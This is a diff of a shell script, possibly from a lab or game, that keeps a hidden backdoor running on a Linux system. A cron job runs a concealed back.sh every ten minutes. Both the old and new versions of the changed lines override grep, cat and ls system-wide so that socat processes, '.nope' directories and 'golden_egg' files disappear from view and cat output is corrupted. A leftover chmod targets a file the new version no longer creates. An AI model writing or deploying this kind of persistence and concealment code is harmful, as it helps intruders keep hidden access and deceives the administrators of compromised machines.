@@ -61,16 +61,11 @@ CRON_JOB="*/10 * * * * /var/.lib/.nope/back.sh >/dev/null 2>&1"
 (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
 
 # Fun stuff with commands! ;)
-cat <<EOF > /etc/profile.d/.funny.sh
-# Alias for grep to ignore 'socat'
-grep() { command grep "$@" | command grep -v 'socat'; }
-
-# Alias for cat to show every other line
-cat() { command cat "$@" | awk 'NR % 2 == 0'; }
-
-# Alias for ls to ignore .hidden directory
-ls() { command ls "$@" | grep -vE '^\..*nope$|^\..*golden_egg$'; }
-EOF
+{
+    echo "alias grep='grep --exclude-dir=.nope --exclude=*.golden_egg'"
+    echo "alias cat='cat --number | grep \"^[0-9]*[02468]\"'"
+    echo "alias ls='ls --hide=\".*nope\" --hide=\".*golden_egg\"'"
+} >> /etc/bash.bashrc
 
 # Set privs for funny.sh
 chmod +x /etc/profile.d/.funny.sh
